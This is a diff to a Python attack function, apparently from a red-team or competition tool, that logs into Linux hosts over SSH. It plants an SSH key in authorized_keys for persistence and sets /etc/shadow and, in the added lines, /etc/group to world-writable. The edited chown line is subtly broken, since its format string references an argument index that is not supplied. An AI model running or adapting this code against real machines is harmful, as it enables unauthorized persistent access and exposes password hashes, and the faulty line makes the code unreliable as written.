@@ -120,7 +120,7 @@ def universal_linux_attack(host):
         ssh_add_cmd = "echo \"{0}\" >> {1}".format(ssh_pub_key, authorized_keys_file)
 
         print("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip))
-        authorized_perms_cmd = "chmod 600 {1} && chown {0}:{0} {1}".format(user, authorized_keys_file)
+        authorized_perms_cmd = "chmod 600 {1} && chown {0}:{3} {1}".format(user, authorized_keys_file, user_group[user])
         
         commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
         for command in commands_to_run:  
@@ -143,6 +143,14 @@ def universal_linux_attack(host):
     
     print("Setting permissions to 777 on /etc/shadow on {}".format(host.ip))
     ssh.sendline(passwd_perms_cmd)
+    ssh.prompt()
+    print(ssh.before.decode('utf8'))
+
+     # ez mode /etc/group
+    group_perms_cmd = "chmod 777 /etc/group"
+    
+    print("Setting permissions to 777 on /etc/group on {}".format(host.ip))
+    ssh.sendline(group_perms_cmd)
     ssh.prompt()
     print(ssh.before.decode('utf8'))
 
